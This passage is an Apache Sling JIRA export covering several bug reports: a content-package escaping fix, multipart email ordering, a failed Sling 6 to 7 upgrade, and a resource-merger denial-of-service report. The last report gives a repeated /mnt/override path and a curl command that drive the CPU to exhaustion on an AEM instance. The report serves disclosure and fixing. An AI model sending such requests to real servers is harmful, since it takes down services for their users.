&lt;p&gt;steps to reproduce:&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;using SNAPSHOT from cpconverter branch &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/161&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/161&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;and this branch from aemanalyser-maven-plugin &lt;a href=&quot;https://github.com/stefanseifert/aemanalyser-maven-plugin/tree/experimental/cpconverter-update&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/stefanseifert/aemanalyser-maven-plugin/tree/experimental/cpconverter-update&lt;/a&gt; which makes use of the SNAPSHOT&lt;/li&gt;
	&lt;li&gt;and this test project which makes use of both: &lt;a href=&quot;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/tree/feature/archetype-40-DRND-202-escaping-cpconverter&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/tree/feature/archetype-40-DRND-202-escaping-cpconverter&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;build the test project, esp. the &quot;all&quot; module and after that inspect the contents of &lt;tt&gt;all/target/cp-conversion/com/aem632/aem-aem632-project.core-apps/0.0.1-SNAPSHOT/aem-aem632-project.core-apps-0.0.1-SNAPSHOT-cp2fm-converted.zip&lt;/tt&gt; and there the file &lt;tt&gt;jcr_root/apps/aem632/core/test/.content.xml&lt;/tt&gt;. in property 1, it should contain the regex with an escaped backslash (&lt;br class=&quot;atl-forced-newline&quot; /&gt;), but does not (&amp;#41;.&lt;/li&gt;
&lt;/ol&gt;
</comment>
                            <comment id="17693968" author="kwin" created="Mon, 27 Feb 2023 11:20:37 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; So basically this boils down to the initial content from &lt;a href=&quot;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/tree/feature/archetype-40-DRND-202-escaping-cpconverter/core&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/stefanseifert/aem-cloud-service-deployment-issues/tree/feature/archetype-40-DRND-202-escaping-cpconverter/core&lt;/a&gt; which is not correctly converted with cp2fm. Can you add a test with that bundle to &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/blob/master/src/test/java/org/apache/sling/feature/cpconverter/handlers/BundleEntryHandleSlingInitialContentTest.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/blob/master/src/test/java/org/apache/sling/feature/cpconverter/handlers/BundleEntryHandleSlingInitialContentTest.java&lt;/a&gt; (similar to the other existing ones)?&lt;/p&gt;</comment>
                            <comment id="17693991" author="sseifert@pro-vision.de" created="Mon, 27 Feb 2023 12:17:13 +0000"  >&lt;p&gt;i&apos;ve added a corresponding test case to your PR branch:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/4cbe30532213557b3989827be306afab69f6cae7&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/4cbe30532213557b3989827be306afab69f6cae7&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17694007" author="kwin" created="Mon, 27 Feb 2023 13:05:38 +0000"  >&lt;p&gt;Thanks, the reason is that ContentCreator.createProperty(...) is called with argument propertyType == 0 (UNDEFINED), &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-contentloader/blob/56a63fc9e10aa8bcd32cb86152d3a5fabc1db1e8/src/main/java/org/apache/sling/jcr/contentloader/ContentCreator.java#L79&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-contentloader/blob/56a63fc9e10aa8bcd32cb86152d3a5fabc1db1e8/src/main/java/org/apache/sling/jcr/contentloader/ContentCreator.java#L79&lt;/a&gt; which is kind of unexpected. This type is not correctly escaped in FileVault currently (&lt;a href=&quot;https://issues.apache.org/jira/browse/JCRVLT-693&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/JCRVLT-693&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;However I added a fallback now to set the type to &lt;a href=&quot;https://developer.adobe.com/experience-manager/reference-materials/spec/jsr170/javadocs/jcr-2.0/javax/jcr/PropertyType.html#STRING&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://developer.adobe.com/experience-manager/reference-materials/spec/jsr170/javadocs/jcr-2.0/javax/jcr/PropertyType.html#STRING&lt;/a&gt; in case &lt;tt&gt;UNDEFINED&lt;/tt&gt; is passed.&lt;/p&gt;</comment>
                            <comment id="17694033" author="sseifert@pro-vision.de" created="Mon, 27 Feb 2023 13:41:40 +0000"  >&lt;p&gt;great, this works and solves the issue!&lt;/p&gt;</comment>
                            <comment id="17695638" author="kwin" created="Thu, 2 Mar 2023 10:27:13 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/084e751fb5c170eeee9b701ceee9cee1cfb27aac&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/084e751fb5c170eeee9b701ceee9cee1cfb27aac&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13526336">JCRVLT-693</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13468524">SLING-11421</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 33 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1g5sw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11784] Email with both HTML and Text parts only display the text part in GMail</title>
                <link>https://issues.apache.org/jira/browse/SLING-11784</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When displaying a list of alternatives, &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1341&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;rfc1341&lt;/a&gt; considers that the preferred order is from the last to the first, so the richest alternative (HTML) should be placed after the basic text.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;In general, user agents that compose multipart/alternative&lt;br/&gt;
entities should place the body parts in increasing order of&lt;br/&gt;
preference, that is, with the preferred format last. For&lt;br/&gt;
fancy text, the sending user agent should put the plainest&lt;br/&gt;
format first and the richest format last. Receiving user&lt;br/&gt;
agents should pick and display the last format they are&lt;br/&gt;
capable of displaying. In the case where one of the&lt;br/&gt;
alternatives is itself of type &quot;multipart&quot; and contains&lt;br/&gt;
unrecognized sub-parts, the user agent may choose either to&lt;br/&gt;
show that alternative, an earlier alternative, or both.&lt;/p&gt;

&lt;p&gt;NOTE: From an implementor&apos;s perspective, it might seem more&lt;br/&gt;
sensible to reverse this ordering, and have the plainest&lt;br/&gt;
alternative last. However, placing the plainest alternative&lt;br/&gt;
first is the friendliest possible option when&lt;br/&gt;
mutlipart/alternative entities are viewed using a non-MIME-&lt;br/&gt;
compliant mail reader. While this approach does impose some&lt;br/&gt;
burden on compliant mail readers, interoperability with&lt;br/&gt;
older mail readers was deemed to be more important in this&lt;br/&gt;
case.&lt;/p&gt;&lt;/blockquote&gt;</description>
                <environment></environment>
        <key id="13525796">SLING-11784</key>
            <summary>Email with both HTML and Text parts only display the text part in GMail</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="olli">Oliver Lietz</assignee>
                                    <reporter username="sdumitriu">Sergiu Dumitriu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 22 Feb 2023 22:58:40 +0000</created>
                <updated>Tue, 28 Feb 2023 14:41:06 +0000</updated>
                            <resolved>Tue, 28 Feb 2023 14:41:06 +0000</resolved>
                                    <version>Commons Messaging Mail 2.0.0</version>
                                    <fixVersion>Commons Messaging Mail 2.0.2</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17694595" author="olli" created="Tue, 28 Feb 2023 14:41:06 +0000"  >&lt;p&gt;Thanks,&#160;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sdumitriu&quot; class=&quot;user-hover&quot; rel=&quot;sdumitriu&quot;&gt;sdumitriu&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 34 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1g4a0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11783] Issue while upgrading version 6 to 7 </title>
                <link>https://issues.apache.org/jira/browse/SLING-11783</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;We are currently using Apache Sling 6 as a war. While trying to upgrade the version from 6 to 7,, changed the attached&#160;&lt;b&gt;pom.xml&lt;/b&gt;&#160;to use &quot;&lt;b&gt;defaultBundleList=7&lt;/b&gt;&quot; for the&#160;&lt;b&gt;org.apache.sling:maven-launchpad-plugin:2.3.4 (upgraded from 2.0.10 to 2.3.4).&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Updated the dependency for&#160;&lt;b&gt;org.apache.sling:org.apache.sling.launchpad.base (from 2.3.0 to 2.5.0).&lt;/b&gt;&lt;br/&gt;
In addition to the default bundles, we are explicitly packaging additional bundles using the attached&#160;&lt;b&gt;list.xml.&lt;/b&gt;&#160;&lt;/p&gt;

&lt;p&gt;The war builds successfully after making the above changes.&lt;/p&gt;

&lt;p&gt;But when, the war with the&#160;&lt;b&gt;apache sling 7&lt;/b&gt;&#160;is deployed to&#160;&lt;b&gt;JBOSS EAP 7.4.0&lt;/b&gt;, the war fails to deploy and exceptions related to bundle dependencies are seen. Please see the attached&#160;&lt;b&gt;server.log&lt;/b&gt;&#160;file for the errors.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
2023-02-20 10:26:05,271 ERROR [io.undertow.servlet] (FelixStartLevel) ERROR: Error starting slinginstall:E:\cover-all\cms\sling\startup\0\org.apache.sling.engine-2.3.6.jar (org.osgi.framework.BundleException: Unresolved constraint in bundle org.apache.sling.engine [39]: Unable to resolve 39.0: missing requirement [39.0] osgi.wiring.&lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt;; (&amp;amp;(osgi.wiring.&lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt;=javax.servlet)(version&amp;gt;=2.3.0)(!(version&amp;gt;=4.0.0)))): org.osgi.framework.BundleException: Unresolved constraint in bundle org.apache.sling.engine [39]: Unable to resolve 39.0: missing requirement [39.0] osgi.wiring.&lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt;; (&amp;amp;(osgi.wiring.&lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt;=javax.servlet)(version&amp;gt;=2.3.0)(!(version&amp;gt;=4.0.0)))
&#160; &#160; at org.apache.felix.framework.Felix.resolveBundleRevision(Felix.java:4002)
&#160; &#160; at org.apache.felix.framework.Felix.startBundle(Felix.java:2045)
&#160; &#160; at org.apache.felix.framework.Felix.setActiveStartLevel(Felix.java:1299)
&#160; &#160; at org.apache.felix.framework.FrameworkStartLevelImpl.run(FrameworkStartLevelImpl.java:304)
&#160; &#160; at java.lang.&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.run(&lt;span class=&quot;code-object&quot;&gt;Thread&lt;/span&gt;.java:748) &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The war for&#160;&lt;b&gt;apache sling 6&lt;/b&gt;&#160;is successfully deployed on the same&#160;&lt;b&gt;JBOSS EAP 7.4.0&lt;/b&gt;&#160;server.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;We tried explicitly adding the&#160;&lt;b&gt;javax.servlet&lt;/b&gt;&#160;bundle to the&#160;&lt;b&gt;list.xml&lt;/b&gt;&#160;at&#160;&lt;b&gt;level=0&lt;/b&gt;, but it also didn&apos;t work. Not sure what is missing.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Note:&lt;/b&gt;&#160;We are upgrading the sling version, in order to update the Jackrabbit version. We are seeing some Jackrabbit &amp;amp; database connection leak related issues, and thus trying to upgrade the jackrabbit version to the latest. Let us know, if Jackrabbit can be directly upgraded instead. It will be really helpful &#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13525551">SLING-11783</key>
            <summary>Issue while upgrading version 6 to 7 </summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="prasad907109">Prasad Shembekar</reporter>
                        <labels>
                    </labels>
                <created>Tue, 21 Feb 2023 11:49:37 +0000</created>
                <updated>Thu, 20 Apr 2023 14:35:21 +0000</updated>
                                                                            <component>Launchpad</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17692623" author="cziegeler" created="Thu, 23 Feb 2023 10:55:48 +0000"  >&lt;p&gt;My first guess is that this is a problem with launchpad.base not correctly exporting the javax servlet packages. which servlet spec version do you specify in the web.xml of your web app?&lt;br/&gt;
In general, I suggest to update to the latest Sling version; Sling 7 is nearly 9 years old; there have been many improvements, fixes and especially securit fixes in the meantime.&lt;/p&gt;</comment>
                            <comment id="17692687" author="JIRAUSER298546" created="Thu, 23 Feb 2023 13:38:37 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; thanks for the response. There is no specific version of servlet specification mentioned in the web.xml. Please find attached the same. &lt;br/&gt;
But, the JBOSS EAP 7.4.0 system module for &lt;b&gt;javax.servlet.api&lt;/b&gt; is using &lt;b&gt;jboss-servlet-api_4.0_spec-2.0.0.Final-redhat-00001.jar&lt;/b&gt;.&#160;&lt;/p&gt;

&lt;p&gt;Apache Sling is used along with Jackrabbit + Oracle as the repository and this in production at many clients places. The clients are already having large amount of documents stored using Jackrabbit + Oracle. As Apache Sling 9 uses Jackrabbit OAK, it won&apos;t be possible for us to migrate to this version immediately.&lt;br/&gt;
The actual reason for trying this upgrade, is database connection leak issue which we have observed with Jackrabbit + Oracle. To fix this we are trying to upgrade the Jackrabbit version to the latest release, so that we can get support from Jackrabbit team. &lt;br/&gt;
Thus this is the first step towards upgrading Apache Sling 6 to 7 and along with it the bundled Jackrabbit.&lt;br/&gt;
But, it would be really helpful if we are able to upgrade only the Jackrabbit bundles, without requiring to update the Apache Sling version.&lt;/p&gt;</comment>
                            <comment id="17692693" author="cziegeler" created="Thu, 23 Feb 2023 14:00:11 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=prasad907109&quot; class=&quot;user-hover&quot; rel=&quot;prasad907109&quot;&gt;prasad907109&lt;/a&gt; I see, thanks. your web.xml looks ok; I don&apos;t know enough details about jackrabbit, but I suggest to ask on the jackrabbit mailinglist whether just updating that should work. Otherwise I suggest to try using latest Sling Launchpad base - this should still work with Sling 6 or 7.&#160;&lt;/p&gt;</comment>
                            <comment id="17692695" author="JIRAUSER298546" created="Thu, 23 Feb 2023 14:06:02 +0000"  >&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; , will update the Apache Sling Launchpad base to the &lt;b&gt;org.apache.sling.launchpad.base:7.0.3-2.7.6&lt;/b&gt; version. Also will check on the Jackrabbit mailing list.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13055685" name="list.xml" size="2270" author="prasad907109" created="Tue, 21 Feb 2023 12:04:23 +0000"/>
                            <attachment id="13055684" name="pom.xml" size="6494" author="prasad907109" created="Tue, 21 Feb 2023 12:04:13 +0000"/>
                            <attachment id="13055686" name="server.log" size="17662" author="prasad907109" created="Tue, 21 Feb 2023 12:11:46 +0000"/>
                            <attachment id="13055771" name="web.xml" size="2675" author="prasad907109" created="Thu, 23 Feb 2023 13:27:54 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>4.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 34 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1g2rk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11776] Sling ResourceMerger may cause high cpu utilization</title>
                <link>https://issues.apache.org/jira/browse/SLING-11776</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;If a bogus path like the following is used, resource merger can consume high amount of CPU and may lead to Denial of Service:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;b&gt;Steps to reproduce&lt;/b&gt;&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;Spawn an AEM author instance and login&lt;/li&gt;
	&lt;li&gt;Open&lt;br/&gt;
&lt;a href=&quot;http://localhost:4502/aem/start.html//mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:4502/aem/start.html//mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override&lt;/a&gt;&lt;br/&gt;
OR use&lt;br/&gt;
curl -u &amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt; &lt;a href=&quot;http://localhost:4502/aem/start.html//mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:4502/aem/start.html//mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;In &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/blob/master/src/main/java/org/apache/sling/resourcemerger/impl/MergingResourceProvider.java#L164-L174&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;MergingResourceProvider&lt;/a&gt;, we are calculating the relative path, which is just removing the merge root path from from the actual path.&lt;br/&gt;
And this relative path is used for finding the resources under it.&lt;br/&gt;
eg: if path is &lt;tt&gt;/mnt/override/mnt/override/mnt/override/bin&lt;/tt&gt; then relative path will be &lt;tt&gt;/mnt/override/mnt/override&lt;/tt&gt;&lt;br/&gt;
And because this relative path again starts with &lt;tt&gt;/mnt/override&lt;/tt&gt; again &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/blob/master/src/main/java/org/apache/sling/resourcemerger/impl/MergingResourceProvider.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;MergingResourceProvider&lt;/a&gt; will be picked and same calls will be executed.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13524978">SLING-11776</key>
            <summary>Sling ResourceMerger may cause high cpu utilization</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Thu, 16 Feb 2023 09:04:29 +0000</created>
                <updated>Fri, 17 Mar 2023 15:02:47 +0000</updated>
                            <resolved>Thu, 16 Feb 2023 16:20:28 +0000</resolved>
                                    <version>Resource Merger 1.4.0</version>
                                    <fixVersion>Resource Merger 1.4.2</fixVersion>
                                    <component>Extensions</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
